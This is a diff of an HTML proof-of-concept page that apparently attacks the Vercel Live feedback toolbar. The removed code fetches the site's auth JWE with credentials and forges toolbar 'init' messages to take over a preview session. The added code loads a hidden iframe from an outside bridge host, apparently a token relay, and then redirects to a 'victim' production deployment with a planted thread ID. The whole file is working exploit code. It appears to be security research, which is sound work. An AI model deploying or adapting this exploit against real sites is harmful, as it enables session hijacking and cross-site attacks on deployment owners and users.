@@ -1,26 +1,19 @@
 <!doctype html>
 <script>
 (() => {
-  const LIVE_ORIGIN = 'https://vercel.live';
-  const BRIDGE_ORIGIN =
-    'https://naturell-toolbar-storage-bridge-202.vercel.app';
+  const BRIDGE_ORIGIN = 'https://naturell-tb-prod-bridge-809.vercel.app';
   const PRODUCTION_HOST =
     'naturell-toolbar-fork-victim-20260809-h763y6e4f-testteam22-687d.vercel.app';
-  const PROJECT_ID = 'prj_eg3xiAzg9rqF1tLFbXOkCwpftLJO';
-  const DOM_MARKER = 'naturell_toolbar_git_preview_production_xss_20260809';
   const SOURCE_MARKER = 'naturell_git_preview_delivery_source_20260809';
-  let vercelAuthJWE = null;
   let bridgeFrame = null;
 
   window.__naturellDelivery = {
     sourceMarker: SOURCE_MARKER,
     phase: 'bootstrap',
-    readyAccepted: false,
-    initAccepted: false,
-    previewAuthAccepted: false,
     bridgeLoaded: false,
     bridgeMessageAccepted: false,
     bridgePhase: null,
+    productionToolbarPrerequisite: true,
     candidateSessionPresent: false,
     candidateDeploymentTarget: null,
     candidateProjectMatched: false,
@@ -29,22 +22,16 @@
     pushAccepted: false,
     pullAccepted: false,
     threadObserved: false,
-    target: null,
-    jweFetchStatus: null,
-    jwePresent: false,
-    initReplyCount: 0,
   };
 
   function recordSafeState() {
     const state = window.__naturellDelivery;
     window.name = `naturell-toolbar-git:${JSON.stringify({
       phase: state.phase,
-      readyAccepted: state.readyAccepted,
-      initAccepted: state.initAccepted,
-      previewAuthAccepted: state.previewAuthAccepted,
       bridgeLoaded: state.bridgeLoaded,
       bridgeMessageAccepted: state.bridgeMessageAccepted,
       bridgePhase: state.bridgePhase,
+      productionToolbarPrerequisite: state.productionToolbarPrerequisite,
       candidateSessionPresent: state.candidateSessionPresent,
       candidateDeploymentTarget: state.candidateDeploymentTarget,
       candidateProjectMatched: state.candidateProjectMatched,
@@ -53,9 +40,6 @@
       pushAccepted: state.pushAccepted,
       pullAccepted: state.pullAccepted,
       threadObserved: state.threadObserved,
-      jweFetchStatus: state.jweFetchStatus,
-      jwePresent: state.jwePresent,
-      initReplyCount: state.initReplyCount,
     })}`;
   }
 
@@ -67,14 +51,6 @@
     recordSafeState();
   }
 
-  function loadToolbar() {
-    const script = document.createElement('script');
-    script.async = true;
-    script.dataset.explicitOptIn = 'true';
-    script.src = 'https://vercel.live/_next-live/feedback/feedback.js';
-    document.head.append(script);
-  }
-
   function loadBridge() {
     if (bridgeFrame) return;
     const bridgeUrl = new URL(`${BRIDGE_ORIGIN}/`);
@@ -82,7 +58,7 @@
     bridgeUrl.searchParams.set('parentOrigin', window.origin);
     bridgeUrl.searchParams.set('run', crypto.randomUUID());
     bridgeFrame = document.createElement('iframe');
-    bridgeFrame.id = 'naturell-toolbar-storage-bridge';
+    bridgeFrame.id = 'naturell-toolbar-production-token-bridge';
     bridgeFrame.src = bridgeUrl.href;
     bridgeFrame.setAttribute('aria-hidden', 'true');
     Object.assign(bridgeFrame.style, {
@@ -107,124 +83,54 @@
     }, 30000);
   }
 
-  async function prepareToolbar() {
-    setPhase('jwe-fetching');
-    try {
-      const response = await fetch('/.well-known/vercel/jwe', {
-        credentials: 'include',
-        cache: 'no-store',
-      });
-      window.__naturellDelivery.jweFetchStatus = response.status;
-      if (response.status === 200) {
-        vercelAuthJWE = await response.text();
-      }
-    } catch {}
-    window.__naturellDelivery.jwePresent = Boolean(vercelAuthJWE);
-    if (!vercelAuthJWE) {
-      setPhase('jwe-unavailable');
-      return;
-    }
-    setPhase('waiting-for-toolbar-ready');
-    loadToolbar();
-  }
-
   addEventListener('message', event => {
     const state = window.__naturellDelivery;
-
     if (
-      event.origin === BRIDGE_ORIGIN &&
-      bridgeFrame &&
-      event.source === bridgeFrame.contentWindow &&
-      event.data?.type === 'naturell-toolbar-storage-bridge'
-    ) {
-      const bridge = event.data.state;
-      if (!bridge || typeof bridge.phase !== 'string') return;
-      state.bridgeMessageAccepted = true;
-      state.bridgePhase = bridge.phase;
-      state.candidateSessionPresent = bridge.candidateSessionPresent === true;
-      state.candidateDeploymentTarget = bridge.candidateDeploymentTarget || null;
-      state.candidateProjectMatched = bridge.candidateProjectMatched === true;
-      state.candidateRoomPresent = bridge.candidateRoomPresent === true;
-      state.uploadAccepted = bridge.uploadAccepted === true;
-      state.pushAccepted = bridge.pushAccepted === true;
-      state.pullAccepted = bridge.pullAccepted === true;
-      state.threadObserved = bridge.threadObserved === true;
-      setPhase(`bridge-${bridge.phase}`);
+      event.origin !== BRIDGE_ORIGIN ||
+      !bridgeFrame ||
+      event.source !== bridgeFrame.contentWindow ||
+      event.data?.type !== 'naturell-toolbar-storage-bridge'
+    ) return;
+    const bridge = event.data.state;
+    if (!bridge || typeof bridge.phase !== 'string') return;
+    state.bridgeMessageAccepted = true;
+    state.bridgePhase = bridge.phase;
+    state.candidateSessionPresent = bridge.candidateSessionPresent === true;
+    state.candidateDeploymentTarget = bridge.candidateDeploymentTarget || null;
+    state.candidateProjectMatched = bridge.candidateProjectMatched === true;
+    state.candidateRoomPresent = bridge.candidateRoomPresent === true;
+    state.uploadAccepted = bridge.uploadAccepted === true;
+    state.pushAccepted = bridge.pushAccepted === true;
+    state.pullAccepted = bridge.pullAccepted === true;
+    state.threadObserved = bridge.threadObserved === true;
+    setPhase(`bridge-${bridge.phase}`);
 
-      const threadId = bridge.threadId;
-      if (
-        state.threadObserved &&
-        state.candidateSessionPresent &&
-        state.candidateDeploymentTarget === 'production' &&
-        state.candidateProjectMatched &&
-        state.candidateRoomPresent &&
-        state.uploadAccepted &&
-        state.pushAccepted &&
-        state.pullAccepted &&
-        typeof threadId === 'string' &&
-        /^naturell-git-preview-thread-[0-9a-f]{16}$/.test(threadId)
-      ) {
-        setPhase('same-tab-production-navigation');
-        const destination = new URL(`https://${PRODUCTION_HOST}/`);
-        destination.searchParams.set('vercelThreadId', threadId);
-        destination.searchParams.set('deliverySource', SOURCE_MARKER);
-        location.replace(destination.href);
-      }
-      return;
-    }
-
-    if (event.origin !== LIVE_ORIGIN || !event.data) return;
-
-    if (event.data.type === 'ready' && event.source && !state.readyAccepted) {
-      state.readyAccepted = true;
-      state.target = event.source;
-      setPhase('preview-init-sent');
-      event.source.postMessage({
-        type: 'preview-origin',
-        previewOrigin: window.origin,
-        path: window.location.pathname + window.location.search,
-      }, LIVE_ORIGIN);
-      event.source.postMessage({
-        type: 'init',
-        authOptions: {
-          hostname: location.hostname,
-          deploymentId: '',
-          path: '/',
-          vercelAuthJWE,
-        },
-        origin: LIVE_ORIGIN,
-        page: '/',
-      }, LIVE_ORIGIN);
-      setTimeout(() => {
-        if (!state.initAccepted) setPhase('preview-init-rejected');
-      }, 12000);
-      return;
-    }
-
+    const threadId = bridge.threadId;
     if (
-      event.data.type === 'init-reply' &&
-      event.source === state.target &&
-      !state.initAccepted
+      state.threadObserved &&
+      state.candidateSessionPresent &&
+      state.candidateDeploymentTarget === 'production' &&
+      state.candidateProjectMatched &&
+      state.candidateRoomPresent &&
+      state.uploadAccepted &&
+      state.pushAccepted &&
+      state.pullAccepted &&
+      typeof threadId === 'string' &&
+      /^naturell-git-preview-thread-[0-9a-f]{16}$/.test(threadId)
     ) {
-      state.initReplyCount += 1;
-      const session = event.data.existingAuth?.session;
-      if (
-        !session ||
-        session.deploymentTarget !== 'preview' ||
-        session.projectId !== PROJECT_ID ||
-        !session.roomId
-      ) {
-        setPhase('preview-auth-rejected');
-        return;
-      }
-      state.initAccepted = true;
-      state.previewAuthAccepted = true;
-      setPhase('preview-authenticated');
-      loadBridge();
+      setPhase('same-tab-production-navigation');
+      const destination = new URL(`https://${PRODUCTION_HOST}/`);
+      destination.searchParams.set('vercelThreadId', threadId);
+      destination.searchParams.set('deliverySource', SOURCE_MARKER);
+      location.replace(destination.href);
     }
   });
 
-  prepareToolbar();
+  if (document.readyState === 'loading') {
+    addEventListener('DOMContentLoaded', loadBridge, {once: true});
+  } else {
+    loadBridge();
+  }
 })();
 </script>
 <meta charset="utf-8">
